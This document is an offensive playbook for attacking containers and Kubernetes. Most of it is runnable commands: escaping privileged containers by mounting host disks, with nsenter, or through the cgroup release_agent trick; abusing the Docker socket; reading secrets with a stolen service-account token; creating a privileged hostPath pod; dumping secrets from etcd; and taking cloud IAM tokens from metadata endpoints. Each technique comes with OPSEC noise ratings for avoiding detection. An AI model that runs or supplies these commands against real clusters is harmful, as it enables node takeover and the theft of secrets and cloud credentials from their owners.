# Container & Kubernetes Attacks

tags: container, kubernetes, k8s, docker, pod-escape, rbac, service-account, etcd, privileged, cgroup, nsenter

## Objective
Escape container isolation, abuse Kubernetes RBAC, and pivot through cluster infrastructure to access secrets, nodes, and adjacent workloads.

## Prerequisites
- Container or pod access (RCE in containerized app, compromised CI runner, exposed API)
- For K8s API attacks: service account token or kubeconfig

## Methodology

### Container Situational Awareness
```bash
# Detect container environment
cat /proc/1/cgroup 2>/dev/null | grep -qi 'docker\|kubepods\|containerd' && echo "CONTAINER"
ls -la /.dockerenv 2>/dev/null && echo "DOCKER"
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "K8S POD"
hostname
mount | grep -E 'overlay|aufs'

# Check capabilities
cat /proc/self/status | grep Cap
capsh --print 2>/dev/null

# Check for privileged mode
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
fdisk -l 2>/dev/null | grep -q '/dev/' && echo "CAN SEE HOST DISKS"
```

### Pod Escape — Privileged Container
```bash
# Mount host filesystem via /dev (privileged containers)
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
cat /mnt/host/etc/shadow
chroot /mnt/host bash

# nsenter to host PID namespace (requires CAP_SYS_ADMIN + hostPID)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Pod Escape — cgroup Release Agent
```bash
# Works when CAP_SYS_ADMIN is available (even non-privileged)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/hostname > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /output
```

### Pod Escape — Writable hostPath Volumes
```bash
# Check for host-mounted paths
mount | grep -v 'overlay\|proc\|sys\|tmpfs\|cgroup'
df -h | grep -v 'overlay\|tmpfs'
ls -la /host* /node* /var/run/docker.sock 2>/dev/null

# Docker socket escape
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
# Create privileged container with host mount
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
```

### Kubernetes API Enumeration
```bash
# Service account token location
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
CA=/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Check permissions
kubectl auth can-i --list 2>/dev/null

# Without kubectl — raw API
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/pods
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/secrets
curl -sk -H "Authorization: Bearer $TOKEN" $API/apis/rbac.authorization.k8s.io/v1/clusterroles
```

### RBAC Abuse
```bash
# List secrets (requires list/get on secrets)
kubectl get secrets -A -o json | jq '.items[].metadata.name'

# Create privileged pod (requires create on pods)
kubectl run pwned --image=alpine --overrides='{
  "spec": {"containers": [{"name": "pwned", "image": "alpine",
    "command": ["sleep", "3600"],
    "securityContext": {"privileged": true},
    "volumeMounts": [{"name": "host", "mountPath": "/host"}]
  }],
  "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
}}' --restart=Never

# Impersonate service accounts (requires impersonate verb)
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system
```

### etcd Access
```bash
# Direct etcd access (port 2379, often unauth in older clusters)
etcdctl --endpoints=https://ETCD_IP:2379 get / --prefix --keys-only

# Extract secrets from etcd
etcdctl --endpoints=https://ETCD_IP:2379 get /registry/secrets --prefix -w json | jq .
```

### Cloud Metadata Pivot
```bash
# AWS IMDS from pod (if IMDSv1 or pod has IRSA)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Graph Reporting
- **Host nodes**: Kubernetes nodes (kubelet hosts), etcd servers
- **Service nodes**: K8s API server/6443, etcd/2379, kubelet/10250
- **Credential nodes**: service account tokens, kubeconfig files, cloud IAM credentials
- **HAS_SESSION edges**: pod shell access, node-level access after escape
- **ADMIN_TO edges**: cluster-admin RBAC, node access from pod escape
- **VALID_ON edges**: service account token → API server
- **REACHABLE edges**: pod-to-pod network, pod-to-node, pod-to-cloud-metadata

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| SA token enumeration | 0.2 | K8s audit logs (if enabled) |
| Secret listing | 0.4 | K8s audit logs — secrets access |
| Privileged pod creation | 0.7 | PodSecurityPolicy/Admission controller alerts |
| Pod escape (nsenter) | 0.6 | Host-level process monitoring |
| Pod escape (cgroup) | 0.5 | Anomalous cgroup writes |
| etcd direct access | 0.3 | Network monitoring for 2379 |
| Cloud metadata access | 0.3 | VPC flow logs, IMDS request logging |

- K8s audit logging is off by default in many clusters — check before assuming detection
- Pod Security Standards (PSS) / OPA Gatekeeper may block privileged pod creation
- Network policies may restrict pod-to-pod and pod-to-metadata traffic
- Falco or similar runtime security tools detect syscall-level escape patterns

## Sequencing
- **After**: Web Application Attacks (RCE in containerized app), CI/CD Exploitation (runner access), Network Recon (API server/etcd identified)
- **Feeds →**: Cloud Exploitation (metadata pivot), Credential Dumping (extracted secrets/tokens), Lateral Movement (node access, adjacent pods)
